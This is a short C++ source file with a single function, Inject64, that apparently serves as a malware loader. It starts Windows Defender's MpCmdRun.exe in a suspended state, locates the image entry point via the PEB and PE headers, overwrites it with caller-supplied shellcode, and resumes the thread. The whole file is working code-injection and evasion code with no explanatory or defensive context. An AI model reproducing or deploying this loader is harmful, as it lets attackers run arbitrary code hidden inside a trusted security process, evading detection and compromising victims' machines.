#include "headers.h"


void Inject64(unsigned char* shellcode, int shellcode_len) {
    
    LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
    LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();

    char binPath[] = "C:\\Program Files\\Windows Defender\\MpCmdRun.exe";

    CreateProcessA(0, (LPSTR) binPath, 0, 0, 0, CREATE_SUSPENDED, 0, 0, pStartupInfo, pProcessInfo);

    // find remote PEB 
    PROCESS_BASIC_INFORMATION* pBasicInfo = new PROCESS_BASIC_INFORMATION();

    // get PROCESS_BASIC_INFORMATION 
    NtQueryInformationProcess(pProcessInfo->hProcess, ProcessBasicInformation, pBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), NULL);

    // get ImageBase offset address from the PEB 
    DWORD64 pebImageBaseOffset = (DWORD64)pBasicInfo->PebBaseAddress + 0x10;

    // get ImageBase 
    DWORD64 ImageBase = 0;
    SIZE_T ReadSize = 8;
    SIZE_T bytesRead = NULL;
    ReadProcessMemory(pProcessInfo->hProcess, (LPCVOID)pebImageBaseOffset, &ImageBase, ReadSize, &bytesRead);

    

    // read target process image headers 
    BYTE headersBuffer[4096] = {};
    ReadProcessMemory(pProcessInfo->hProcess, (LPCVOID)ImageBase, headersBuffer, 4096, NULL);

    // get AddressOfEntryPoint
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
    LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD64)ImageBase);

    // write shellcode to image entry point and execute it 
    WriteProcessMemory(pProcessInfo->hProcess, (LPVOID)codeEntry, shellcode, shellcode_len, NULL);
    ResumeThread(pProcessInfo->hThread);
    
}
